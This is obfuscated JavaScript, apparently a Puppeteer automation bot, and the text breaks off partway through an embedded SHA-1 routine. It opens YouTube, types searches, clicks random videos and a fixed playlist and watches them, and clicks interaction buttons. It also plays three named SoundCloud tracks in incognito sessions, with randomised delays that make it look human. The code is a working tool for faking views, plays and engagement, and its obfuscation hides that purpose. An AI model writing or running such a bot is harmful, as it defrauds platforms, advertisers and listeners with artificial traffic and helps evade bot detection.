function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x160f + -0x2047 + 0x3656);
    let h = e[f];
    if (b['NXqzOF'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x15b4 + -0x1f9f * 0x1 + 0xb * 0x4d9, s, t, u = 0xf2 * -0xd + 0x1 * -0x17bf + -0x3 * -0xc03; t = n['charAt'](u++); ~t && (s = r % (0x12c2 + 0x86f * -0x2 + 0x2 * -0xf0) ? s * (0x1 * 0xc25 + -0x3 * 0x920 + 0x529 * 0x3) + t : t, r++ % (-0x239b + 0xae6 + 0x18b9 * 0x1)) ? p += String['fromCharCode'](0x1 * 0xe55 + -0xdb6 + 0x60 & s >> (-(-0x94d + -0x2421 + 0x2d70) * r & 0x4 * 0x5b5 + 0x5 * 0x213 + -0x212d)) : -0x23c9 + -0x7be * 0x2 + 0x3345) {
          t = o['indexOf'](t);
        }
        for (let v = 0x532 + 0x53f + -0xa71, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x1 * 0x22c7 + 0x1382 + -0x3639))['slice'](-(-0x9aa + -0x2 * 0x79d + 0x2 * 0xc73));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x228 + 0x7 * 0x1df + -0xaf1,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x1 * 0x79a + 0x1 * 0xfb3 + 0x819 * -0x1; u < 0x205b * -0x1 + -0x16bb + 0x3816; u++) {
          p[u] = u;
        }
        for (u = -0x13c0 + -0xf3 * 0x1f + 0x312d * 0x1; u < 0x15d + 0x1 * 0x346 + -0x13 * 0x31; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0xfb6 + 0x1fa7 + -0x53 * 0x8f), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x220 + 0x2093 * 0x1 + -0x22b3, q = -0x1a2f * 0x1 + -0xdf * -0x21 + -0x290;
        for (let v = 0x2 * 0xb2c + 0x2bf * 0x7 + 0x1 * -0x2991; v < n['length']; v++) {
          u = (u + (-0x26a9 + 0x5df + 0x20cb)) % (-0x1593 + -0x196e + 0x3001), q = (q + p[u]) % (0x1 * -0x1b2f + 0x49f + 0x1790), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0xb33 + -0x26cc + 0x32ff)]);
        }
        return t;
      };
      b['cjWJRo'] = m, c = arguments, b['NXqzOF'] = !![];
    }
    const j = e[0x1fe6 + -0x231b * -0x1 + -0x4301],
      k = f + j,
      l = c[k];
    return !l ? (b['jEYFEM'] === undefined && (b['jEYFEM'] = !![]), h = b['cjWJRo'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const Z = b,
  Y = c,
  X = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x13 * -0x115 + -0x2ac + 0x2fb * -0x6))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x135 * -0x13 + 0x2 * 0x18d + -0x1 * 0x1a09), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x4c6a + -0x1 * -0xadd5 + -0x850f + (-0x5 * -0x12e + 0x1 * 0x3b2a + -0x678) * random()) : await standardWaitForNetIdle(f), await wait(-0x260e + -0x94d + 0x42e3 + (0x1 * -0x3b0b + 0x1 * 0x2da9 + -0x1a39 * -0x2) * random()), -0x23c9 + -0x7be * 0x2 + 0x3346;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x532 + 0x53f + 0x917), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x1 * 0x22c7 + 0x1382 + -0x3648;
}
async function randomWait() {
  return await wait(-0x9aa + -0x2 * 0x79d + 0x4 * 0xb1b + (-0x228 + 0x7 * 0x1df + 0x897) * random()), -0x1 * 0x79a + 0x1 * 0xfb3 + 0x818 * -0x1;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x205b * -0x1 + -0x16bb + 0x3716, -0x13c0 + -0xf3 * 0x1f + 0x189a * 0x2), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x1062 + 0x1 * 0x2749 + -0xb * -0x103f) * getRandomInt(0xfb6 + 0x1fa7 + -0x1b * 0x1c1, 0x220 + 0x2093 * 0x1 + -0x22ae), h)), -0x1a2f * 0x1 + -0xdf * -0x21 + -0x28f;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const R = b,
      h = {
        'Seconds': 0x3e8,
        'Minutes': 0xea60,
        'Hours': 0x36ee80,
        'Second': 0x3e8,
        'Minute': 0xea60,
        'Hour': 0x36ee80
      };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x2 * 0xb2c + 0x2bf * 0x7 + 0x1 * -0x2991;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x26a9 + 0x5df + 0x20cb]['split']('\x20');
    for (let k = -0x1593 + -0x196e + 0x2f01; k < i[R(0x16, 'qnY#')]; k += 0x1 * -0x1b2f + 0x49f + 0x1692)
      j += i[k] * h[i[k + (-0xb33 + -0x26cc + 0x3200)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x1fe6 + -0x231b * -0x1 + -0x42fb)['map'](l => Array['from'](l['children']))['flat'](0x20d1 + -0x20c * 0x1 + 0x2cc * -0xb)['map'](l => l['childNodes'][-0x1285 * -0x2 + 0x1 * -0x22d + -0x1 * 0x22dc]['childNodes'][0x59d * -0x2 + -0x1722 + 0x225c]['childNodes'][0xe9e + -0x18d * 0x11 + -0xbc * -0x10]['childNodes'][-0x3 * -0x1b0 + -0x63a + -0x95 * -0x2]['childNodes'][-0x12 * 0x166 + -0x103f * -0x2 + -0x1 * 0x751]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x84 * -0x2e + -0x71 + -0x1 * 0x135f, -0x19bd + -0x19 * -0x5f + 0x23fe)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x1 * -0x672b + 0x4ab6 * -0x1 + 0x1e23);
  const h = await getMaxTime(f),
    i = Math['min']((0x1 * -0xf8d9 + 0xf643 + 0xecf6) * getRandomInt(0x2192 + -0x1 * -0xeae + 0x26 * -0x145, 0xc0f + -0x66d + -0x59d), h);
  return await wait(i), 0xf7 * -0x19 + 0x1361 + -0xf3 * -0x5;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0xa61 + 0x1f61 + -0x1 * 0x29c2]['children'][-0x24a * 0xa + 0x1315 + 0x3cf * 0x1]['children'][-0x8 * -0x14c + 0x1fad + -0x5 * 0x869]['children'][-0x1cf + 0xe9d + -0xcce]['children'][0x17c + -0x17 * -0x1f + -0x445]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0xae2 + 0x16a6 + 0xb2d * -0x3;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0xef0 + -0x1e25 + 0xf99 + (-0x3 * 0x107 + -0x34b * 0x6 + 0x1709 * 0x1) * random()
  }), await wait(-0xf6d + 0x24f7 + -0x1396 + (-0x1931 + 0x26b5 + -0x278 * 0x5) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x4ad + 0x2f * 0xc2 + -0x1 * 0x1eef]['childNodes'][-0x1e2 * -0x6 + -0x168a + 0xb3f]['childNodes'][-0x3 * 0x36e + -0x16fe + 0x2149]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0xd97 + 0xcab + 0x8bf * -0x3]['childNodes'][-0x799 + -0x1 * 0x19ee + -0x1 * -0x2187]['childNodes'][0x91f * 0x2 + 0x3 * -0xabd + 0xdfb]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0xf12 + -0x14 * 0x1db + 0xd1 * 0x1b),
          r = 0x5 * -0x74b + 0x1 * -0x3d8 + -0x1 * -0x284f;
        for (let u = -0x2 * -0x11fc + -0x15d * -0x13 + 0x1 * -0x3ddf; u < q['length']; u += -0x2516 + 0xc1d + 0x18fb)
          r += q[u] * k[q[u + (0x249e + 0x17 * -0xb3 + -0x9 * 0x248)]];
        return r;
      }(n);
  });
  await wait((0x5041 + -0x6333 + 0x4d8a) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x5076 * -0x1 + 0x1 * 0x936b + 0xa76b) * getRandomInt(0x1537 + 0x192c + -0x2e62, 0x1132 + -0x15e6 + 0x4be), h + (-0x111 + -0x3 * -0xc25 + -0xfd6));
  return await wait(i), 0x2565 + 0x654 * 0x6 + 0x1a * -0x2e6;
}
async function keyWatch(f) {
  const S = d;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x1 * 0x19c7 + 0x1 * -0x1ec4 + 0x1 * 0x4fd), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + S(0xd) + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x3 * 0x3e + -0x1 * 0x1475 + 0x53 * 0x61 + (0x1e * 0x146 + 0x257d + -0x47c9) * Math['random']());
    });
  }, -0xd * -0x409 + -0x2772 + 0x4c7 * 0x3);
  await wait(-0x1 * -0x6c0c2 + -0x8 * 0x764b + 0x18576);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0xb3 * -0x8a + 0x7 * -0x2287 + 0x17b93) * getRandomInt(0x112c * 0x1 + 0x174f + -0x1 * 0x2877, 0x25d8 + -0xe70 + -0x174f)), clearInterval(h), 0x3 * -0xcf5 + -0xff6 + 0x1 * 0x36d6;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0xe9b * -0x1 + 0x2f4 * -0x3 + -0x5bf;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x290 + -0x25f8 + 0x3 * 0xd83;
    await randomWait();
  }
  return -0x189d + -0x108f * 0x2 + 0x39bc;
}

function fetchRandomSC() {
  const T = d;
  return Math['random']() <= 0x1 * -0x1232 + 0xc0 * 0x34 + 0xa67 * -0x2 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x22b8 + -0x14 + -0x22a4 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + T(0x6) : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const V = b,
      U = c;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x1223 + 0x417 * 0x5 + 0x8 * -0x4a + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x1105 * -0x2 + 0x26 * 0x1d + 0x1dbc;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x1 * 0x4c29 + -0xb7c9 + 0x1b3ba + getRandomInt(0x10f * -0x5c + 0x43 * 0x1a7 + -0x2d47 * -0x1, 0x5bda + -0x38b * -0x4 + 0x1 * 0xb2a));
      } catch (n) {}
      return await k[U(0x11)](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets[U(0x14) + 'h'](-0x1cfa + -0xf84 + 0x2c7f * 0x1), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x1 * -0x259d + -0x1a * 0x131 + -0x6a3;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x23ec + -0x2b * 0x3 + 0x246d, 0x16a9 * 0x1 + -0x94e * -0x2 + -0x2913)), v[V(0x8, 'z7qg')]('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0xab7 * 0x2 + -0x1 * 0x17a3 + -0x1 * -0xa05 + floor((-0x317 * -0x8 + 0x1bad + -0x307d * 0x1) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0xb0e0292c + 0x1 * -0xa32e8ebe + 0x1d40eb7ea),
          0x36d4ca * -0x4 + 0x1 * 0x9f6e9 + 0x1515c3f,
          -0xfccc + -0xa1 * 0x184 + 0x270d0,
          0x225 * 0x2 + -0x1753 + -0x683 * -0x3
        ], y = [
          -0x3 * 0xb9 + -0x143d + 0x1680,
          0xe21 * 0x1 + 0x2307 + -0x2 * 0x188c,
          -0x5 * -0x65b + -0x20 * 0x2f + -0x25 * 0xb3,
          -0x1044 + -0x44f * -0x5 + -0x547
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0xef3 + -0x606 * -0x1 + -0x14f8)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0xc * -0x36 + 0x2195 + -0x241d; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              const W = c;
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N[W(0x15) + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x11d6 + -0x1eb6 + 0x19c * 0x8) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x3 * -0x29b + 0x1cbc + -0x1 * 0x248d] = A[0x16e6 + -0x1fa3 + 0x1 * 0x8cd] = A[0x98a + 0x1df3 + 0x5a4 * -0x7] = A[0x280 + 0x1fb6 + -0x1 * 0x2234] = A[-0x359 * 0x2 + -0xecd + -0x1 * -0x1582] = A[0x2399 + 0x4 * -0x337 + -0x16b9] = A[0x1 * 0x1e + 0x15 * 0x5d + -0x7ba] = A[-0x9a4 + -0x53 * -0x68 + -0x180e] = A[-0x1 * 0x10b1 + 0x385 * 0x1 + 0xd33 * 0x1] = A[0xeab + -0xee1 * 0x2 + 0xf1f * 0x1] = A[-0x3 * -0x332 + -0x33 * -0x2c + -0x3 * 0x61b] = A[-0x84d + 0x31 * -0x6 + 0x97d] = A[-0xb8 + -0x9f4 + 0xab7] = A[0x3a * 0x65 + 0x1163 * 0x1 + -0x1 * 0x2839] = A[0x9ae + -0xc80 + 0x23 * 0x15] = A[0x4a1 * 0x1 + 0x3b3 * 0x8 + -0x222b] = A[0x2047 + -0x3a8 + 0x1c90 * -0x1] = 0x1364 + 0x4c4 * -0x5 + 0x1 * 0x470, this['blocks'] = A) : this['blocks'] = [
                0x22de + -0x3 * 0x699 + 0xe3 * -0x11,
                -0x2d8 * 0x8 + -0x1 * 0x162a + 0x2cea,
                0x906 + -0x17 * -0x133 + -0x1 * 0x249b,
                -0x68e + -0x1 * -0x27b + -0x1 * -0x413,
                0x5ba + 0x26ff + -0x2cb9,
                0x12cd + -0x1 * 0x9be + -0x3 * 0x305,
                -0x8b7 + -0x1031 + 0x18e8,
                0x35 * -0xab + 0x472 * 0x4 + -0x1 * -0x119f,
                -0x2 * 0x127 + -0x454 + 0x6a2,
                -0x1110 + -0x619 + 0x7 * 0x34f,
                0x5 * 0x409 + 0x14e4 + -0x1 * 0x2911,
                0x126 + -0x1a95 + -0x196f * -0x1,
                0x127 + 0x14f * 0xf + -0x14c8,
                -0x1cfc + -0x198a + -0x7ca * -0x7,
                0x2284 + 0xbdb + -0x2e5f,
                0x1904 * 0x1 + -0x5bd * 0x2 + -0xd8a,
                0x478 + 0x1742 * 0x1 + -0x1bba
              ], this['h0'] = -0x1 * -0xc3ac81a9 + -0x3 * 0x207d663d + -0x63c18b * -0xd, this['h1'] = 0x117527c3e * 0x1 + -0x15ef9 * -0x1727 + -0x4742a7a4, this['h2'] = 0x101f43969 + -0x1 * 0x4cb6cd81 + -0x1c828eea, this['h3'] = -0x4 * -0x6f1ff34 + 0x1d31c56e + -0x28c76dc8, this['h4'] = 0x1174f89c2 + -0xc1646b09 + -0x1d3dd * -0x3c23, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x24db + 0x2 * -0x7a9 + 0x342d, this['finalized'] = this['hashed'] = -0x2572 + 0x69c + 0x1ed6, this['first'] = 0x1 * 0xf26 + 0xb * -0x26b + 0x4 * 0x2dd;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x110 + 0x65 * -0x63 + 0x47 * 0x89, O = J['length'] || -0x1725 + 0x4cd * 0x3 + 0x8be, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x1bfd * -0x1 + -0x2627 + -0x4224 * -0x1, P[-0x2393 * -0x1 + 0xc73 + 0x2 * -0x1803] = this['block'], P[0x149f + 0xf7 * 0x27 + -0x3a30] = P[-0xa3 * 0x11 + -0x1 * 0x1b9d + 0x1 * 0x2671] = P[0x16 * 0x47 + 0x1e4e + -0x2466] = P[-0xc * 0xbf + 0x260 + 0x697] = P[-0x7bf * 0x1 + -0x22c + 0x9ef] = P[-0x26 * 0x78 + -0x127 * 0x1d + 0x3340] = P[-0x24b9 + 0x165b * 0x1 + 0x6 * 0x266] = P[-0x1 * -0x4e1 + 0x391 * -0x6 + 0x1 * 0x108c] = P[0x924 + 0x1dab + 0x9 * -0x44f] = P[0x2433 + -0x1 * -0x88d + -0x2cb7] = P[0x1168 * -0x1 + -0x22ab + 0x115f * 0x3] = P[0x224 + -0x10fb + -0x5 * -0x2fa] = P[0x168d + -0x1 * 0xb03 + -0xb7e] = P[-0x22 * 0xaa + -0x4ae + 0x1b4f] = P[-0x5 * -0x6bc + -0x1 * 0xd8f + -0x140f] = P[0xbf * 0x5 + 0x235c + -0x9c2 * 0x4] = 0x1b10 + 0xde1 + -0x1 * 0x28f1), K) {
                    for (N = this['start']; M < O && N < 0x1de3 + -0x29f * -0xc + 0x3d17 * -0x1; ++M)
                      P[N >> 0x45 * 0x16 + -0x1 * -0xa2e + -0x101a] |= J[M] << y[-0x6c2 * -0x4 + -0xc38 + -0xecd & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x559 + 0x1 * -0x952 + 0x439; ++M)
                      (L = J['charCodeAt'](M)) < 0x16a8 + -0x2256 + 0xc2e ? P[N >> -0x1db6 + 0x195a + 0x45e] |= L << y[-0x2502 + -0xef4 + 0x33f9 & N++] : L < -0x24dd * -0x1 + -0xb8 + -0x1c25 ? (P[N >> -0x9 * 0x25f + 0x1 * -0x1b32 + 0x308b] |= (0x115 * -0x3 + -0x1095 + -0x525 * -0x4 | L >> 0xe93 * -0x1 + 0xb5d + -0x3 * -0x114) << y[-0xacc + 0x47b + 0x654 & N++], P[N >> -0xf44 + 0x1 * -0x16d7 + 0x261d * 0x1] |= (-0x1 * 0x36d + 0x2629 + -0x223c | 0x81 * -0x3f + 0x14 * -0x7b + -0xa * -0x429 & L) << y[-0x26b8 + -0xc75 + -0xc * -0x444 & N++]) : L < -0x3 * -0x3319 + 0x3613 * -0x4 + -0x19 * -0xb29 || L >= -0xc73f + 0x7d7c * -0x2 + 0x2a237 ? (P[N >> -0x5ea + 0x1 * -0x51d + 0x235 * 0x5] |= (-0x14b1 * -0x1 + 0x1811 + 0x112 * -0x29 | L >> -0x1600 + -0x1f * -0x45 + -0xdb1 * -0x1) << y[0x9 * -0x18e + 0x1 * 0x1779 + -0x978 & N++], P[N >> 0x1bb * -0x2 + 0x5 * 0x7bd + -0x2339] |= (0x2545 + -0x404 * 0x9 + -0xa1 | L >> 0xbc * -0x29 + -0x1 * -0x1767 + 0x6bb & -0xc1f + 0x5 * -0x780 + 0x31de) << y[0x73f * -0x3 + 0x16 * 0x158 + -0x7d0 & N++], P[N >> 0x69d + 0xba * -0x12 + 0x1 * 0x679] |= (-0x7d * 0x1f + -0x241d + 0x33c0 | 0x1 * -0x11c3 + 0x1562 + -0x360 & L) << y[0x2286 + 0x12 * -0xef + -0x11b5 & N++]) : (L = 0x3ae5 * 0x7 + -0x7f9b + -0x83 * 0x38 + ((0x1 * 0x70e + -0xb5 * 0xd + 0x622 & L) << -0x7 * 0xb5 + 0x1a97 + -0x5 * 0x452 | -0x2 * -0x5bb + -0x94a + 0x1d3 & J['charCodeAt'](++M)), P[N >> -0x23b * 0x8 + 0x18 * -0xe8 + 0x279a] |= (-0xd03 * 0x2 + 0x1 * -0x1825 + -0x7 * -0x74d | L >> -0x19ee + -0x1 * -0x254b + -0xb4b * 0x1) << y[0x1e44 + -0x9 * 0x2a8 + -0x659 & N++], P[N >> 0x164e + 0x5a7 * -0x2 + -0xafe] |= (-0xb7f + -0x97b * -0x1 + -0x7 * -0x5c | L >> 0x16d5 + -0x281 * 0x6 + -0x7c3 & 0x14c * -0x1 + 0x6f9 + -0x56e) << y[0x2013 + -0x7 * -0x223 + -0x2f05 & N++], P[N >> 0x1c85 + 0xe6b * 0x2 + -0x1 * 0x3959] |= (-0x1 * -0xcf2 + -0x7 * -0x77 + -0xfb3 | L >> -0x869 + 0x2189 + -0xee * 0x1b & 0x1bab + -0x157 + -0x1a15) << y[-0x2661 + -0x1924 + 0x26 * 0x1ac & N++], P[N >> -0x12d1 + 0x3 * -0x707 + 0x4fd * 0x8] |= (0xa8 + -0xfe8 + 0xfc0 | -0x6d1 + -0x256b + 0x2c7b & L) << y[-0x597 + -0x61 + -0x5fb * -0x1 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x2292 + -0x1231 + 0x3503 ? (this['block'] = P[-0x57 * 0x34 + 0xb * 0xc2 + -0x6 * -0x191], this['start'] = N - (0xe * -0x10a + 0x12bc + -0x3f0), this['hash'](), this['hashed'] = 0x46 * -0x31 + -0x6a * -0x23 + -0x117) : this['start'] = N;
                }
                return this['bytes'] > -0x65d87e00 + -0x15ec0435b + 0x2c498c15a && (this['hBytes'] += this['bytes'] / (-0x3b1f4a * 0x66 + -0x1db736fd4 + -0x2f301e75 * -0x10) << -0x108c + 0xcd5 + 0x3 * 0x13d, this['bytes'] = this['bytes'] % (-0x11d62ed68 + 0x9c587380 + 0xa18 * 0x26257f)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x108 + -0x3 * 0xb8b + 0x23aa;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
